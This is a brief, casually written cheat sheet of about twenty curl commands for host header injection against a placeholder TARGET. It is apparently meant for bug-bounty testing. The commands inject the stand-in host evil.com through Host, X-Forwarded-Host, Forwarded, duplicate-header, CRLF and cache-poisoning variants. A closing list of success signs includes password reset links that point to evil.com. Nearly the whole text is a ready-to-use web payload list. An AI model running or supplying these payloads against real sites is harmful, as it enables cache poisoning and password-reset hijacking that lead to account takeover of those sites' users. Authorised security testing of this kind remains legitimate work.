Test All these on your sudomains lil bro, 
## Basic Host Header Injection

```bash
curl -I https://TARGET -H "Host: evil.com"
```

## X-Forwarded-Host Injection

```bash
curl -I https://TARGET -H "X-Forwarded-Host: evil.com"
```

## X-Host Header Injection

```bash
curl -I https://TARGET -H "X-Host: evil.com"
```

## X-Forwarded-Server Injection

```bash
curl -I https://TARGET -H "X-Forwarded-Server: evil.com"
```

## X-HTTP-Host-Override

```bash
curl -I https://TARGET -H "X-HTTP-Host-Override: evil.com"
```

## Forwarded Header (RFC 7239)

```bash
curl -I https://TARGET -H "Forwarded: host=evil.com"
```

## Forwarded Header with Proto

```bash
curl -I https://TARGET -H "Forwarded: proto=https;host=evil.com"
```

## X-Forwarded-For + Host Combo

```bash
curl -I https://TARGET -H "X-Forwarded-For: 127.0.0.1" -H "Host: evil.com"
```

## Multiple Host Headers (Duplicate)

```bash
curl -I https://TARGET -H "Host: TARGET" -H "Host: evil.com"
```
## Host + X-Forwarded-Host Combo

```bash
curl -I https://TARGET -H "Host: TARGET" -H "X-Forwarded-Host: evil.com"
```

## Absolute URL in Host Header

```bash
curl -I https://TARGET -H "Host: https://evil.com"
```

## Host Header with Port

```bash
curl -I https://TARGET -H "Host: evil.com:443"
```

## Host Header with Trailing Dot

```bash
curl -I https://TARGET -H "Host: evil.com."
```

## Host Header with Subdomain Injection

```bash
curl -I https://TARGET -H "Host: evil.com.target.com"
```

## Host Header with @ Injection

```bash
curl -I https://TARGET -H "Host: evil.com@target.com"
```

## Host Header CRLF Injection (If HTTP/1.1)

```bash
curl -I https://TARGET -H $'Host: evil.com\r\nX-Test: injected'
```

## Web Cache Poisoning via Host Header

```bash
curl -I https://TARGET -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"
```

## Origin Header Injection (CORS related)

```bash
curl -I https://TARGET -H "Origin: https://evil.com"
```

## Referer Based Host Confusion

```bash
curl -I https://TARGET -H "Referer: https://evil.com"
```

## Host Header in POST Request

```bash
curl -X POST https://TARGET -H "Host: evil.com" -d "test=test"
```

## HTTP/1.1 Forced Host Test

```bash
curl -I --http1.1 https://TARGET -H "Host: evil.com"
```

## Proxy Style Host Injection

```bash
curl -I https://TARGET -H "X-Original-Host: evil.com"
```

## Success Indicators (What to Look For)

```text
Location: https://evil.com
Absolute links pointing to evil.com
Password reset links using evil.com
Cache poisoning persistence
```
